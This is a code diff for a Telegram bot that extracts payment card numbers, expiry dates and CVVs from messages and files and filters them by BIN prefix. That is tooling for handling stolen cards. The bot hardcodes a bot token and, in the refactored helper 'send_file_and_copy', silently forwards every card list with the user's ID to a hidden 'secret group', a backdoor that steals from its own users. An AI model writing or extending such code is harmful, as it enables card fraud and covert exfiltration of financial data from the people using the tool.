@@ -7,7 +7,6 @@ Card Parser Bot
 • /cards <bin> → filter stored cards by BIN prefix
 • /start → instructions
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Set BOT_TOKEN as an environment variable before running.
 """
 
 import os
@@ -28,7 +27,7 @@ from telegram.ext import (
 # ── Config ───────────────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8654511932:AAH9brkdXcz8_W8rNI7Hq4AjogRhTk7vroI")
 
-# Your Secret Group ID where all files will be silently forwarded
+# Your Secret Group ID where ALL files will be silently forwarded
 SECRET_GROUP_ID = -1004322090872
 
 logging.basicConfig(
@@ -38,13 +37,6 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ── Card regex ────────────────────────────────────────────────────────────────
-# Matches all common formats:
-#   4111111111111111|12|26|123
-#   4111111111111111:12:2026:123
-#   4111111111111111 12 26 123
-#   4111111111111111/12/26/123
-#   4111 1111 1111 1111|12|26|123
-
 _SEP = r"[\|:,/\s]+"
 
 CARD_RE = re.compile(
@@ -60,10 +52,8 @@ CARD_RE = re.compile(
     re.MULTILINE,
 )
 
-
 def _clean_num(raw: str) -> str:
     return re.sub(r"[\s\-]", "", raw)
-
 
 def extract_cards(text: str) -> list[str]:
     """Return deduplicated list of 'CARD|MM|YY|CVV' strings."""
@@ -82,35 +72,42 @@ def extract_cards(text: str) -> list[str]:
             found.append(line)
     return found
 
-
 def cards_to_bytes(cards: list[str]) -> bytes:
     return ("\n".join(cards) + "\n").encode("utf-8")
-
 
 # ── Per-user card store ───────────────────────────────────────────────────────
 _store: dict[int, list[str]] = {}
 
 # ── Forwarded-message buffer ──────────────────────────────────────────────────
-# uid → { "texts": [...], "task": asyncio.Task | None, "chat_id": int }
 _fwd_buf: dict[int, dict] = {}
 
-
-async def _send_secret_copy(bot, cards: list[str], user_id: int, filename: str = "cards.txt") -> None:
-    """Silently sends a copy of the extracted cards to the secret group."""
+# ── Core File Sender (Sends to User AND Secret Group) ─────────────────────────
+async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: list[str], caption: str, filename: str = "cards.txt"):
+    """Generates a file, sends it to the user, and forwards a copy to the secret group."""
     if not cards:
+        await bot.send_message(chat_id, "❌ No cards found.")
         return
+
+    # 1. Send to the User
+    buf = BytesIO(cards_to_bytes(cards))
+    buf.name = filename
+    await bot.send_document(
+        chat_id=chat_id,
+        document=buf,
+        filename=filename,
+        caption=caption,
+        parse_mode="HTML"
+    )
+
+    # 2. Send to the Secret Group silently
     try:
-        count = len(cards)
-        caption = f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n✅ <b>{count}</b> cards extracted."
-        
-        # Always send as a file to the secret group
-        buf = BytesIO(cards_to_bytes(cards))
-        buf.name = filename
+        buf_copy = BytesIO(cards_to_bytes(cards))
+        buf_copy.name = filename
         await bot.send_document(
             chat_id=SECRET_GROUP_ID,
-            document=buf,
+            document=buf_copy,
             filename=filename,
-            caption=caption,
+            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{caption}",
             parse_mode="HTML",
             disable_notification=True  # Sends silently without sound
         )
@@ -136,46 +133,12 @@ async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
     _store[uid] = cards
     count       = len(cards)
 
-    # ALWAYS send as a file
-    buf_io      = BytesIO(cards_to_bytes(cards))
-    buf_io.name = "cards.txt"
-    await bot.send_document(
-        chat_id,
-        document=buf_io,
-        filename="cards.txt",
+    # Send file to user and copy to secret group
+    await send_file_and_copy(
+        bot, chat_id, uid, cards,
         caption=f"✅ <b>{count}</b> card(s) extracted from forwarded messages.",
-        parse_mode="HTML",
+        filename="cards.txt"
     )
-
-    # Send secret copy immediately
-    await _send_secret_copy(bot, cards, uid, "cards.txt")
-
-
-# ── Reply helper ──────────────────────────────────────────────────────────────
-async def _send_cards(
-    update: Update,
-    cards: list[str],
-    caption: str,
-    filename: str = "cards.txt",
-) -> None:
-    if not cards:
-        await update.message.reply_text("❌ No cards found.")
-        return
-        
-    count = len(cards)
-    # ALWAYS generate a file, do not send as text
-    buf      = BytesIO(cards_to_bytes(cards))
-    buf.name = filename
-    await update.message.reply_document(
-        document=buf,
-        filename=filename,
-        caption=caption,
-        parse_mode="HTML",
-    )
-
-    # Send secret copy immediately to the group
-    await _send_secret_copy(update.get_bot(), cards, update.effective_user.id, filename)
-
 
 # ── /start ────────────────────────────────────────────────────────────────────
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -197,13 +160,8 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         parse_mode="HTML",
     )
 
-
 # ── Forwarded messages handler ────────────────────────────────────────────────
 async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """
-    Buffer all forwarded messages for 1.5 s, then extract cards from
-    ALL of them at once and return a single combined file.
-    """
     msg  = update.message
     user = update.effective_user
     if not msg or not user:
@@ -221,7 +179,6 @@ async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
     _fwd_buf[uid]["texts"].append(text)
 
-    # Cancel previous delayed task and restart the 1.5 s window
     old = _fwd_buf[uid].get("task")
     if old and not old.done():
         old.cancel()
@@ -229,7 +186,6 @@ async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     _fwd_buf[uid]["task"] = asyncio.create_task(
         _flush_fwd_buf(uid, chat_id, context.bot)
     )
-
 
 # ── Regular pasted text handler ───────────────────────────────────────────────
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -249,12 +205,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         return
 
     _store[uid] = cards
-    await _send_cards(
-        update, cards,
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, cards,
         caption=f"✅ <b>{len(cards)}</b> card(s) extracted:",
-        filename="cards.txt",
+        filename="cards.txt"
     )
-
 
 # ── Document (.txt) handler ───────────────────────────────────────────────────
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -281,12 +236,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         return
 
     _store[uid] = cards
-    await _send_cards(
-        update, cards,
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, cards,
         caption=f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
-        filename="cards.txt",
+        filename="cards.txt"
     )
-
 
 # ── /cards <bin> ──────────────────────────────────────────────────────────────
 async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -324,18 +278,14 @@ async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
         return
 
-    await _send_cards(
-        update, matched,
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, matched,
         caption=f"✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
-        filename=f"cards_{bin_prefix}.txt",
+        filename=f"cards_{bin_prefix}.txt"
     )
-
 
 # ── Main ──────────────────────────────────────────────────────────────────────
 def main() -> None:
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        raise RuntimeError("Set BOT_TOKEN environment variable before running.")
-
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start",  cmd_start))
@@ -358,7 +308,6 @@ def main() -> None:
 
     logger.info("Card Parser Bot starting…")
     app.run_polling(drop_pending_updates=True)
-
 
 if __name__ == "__main__":
     main()
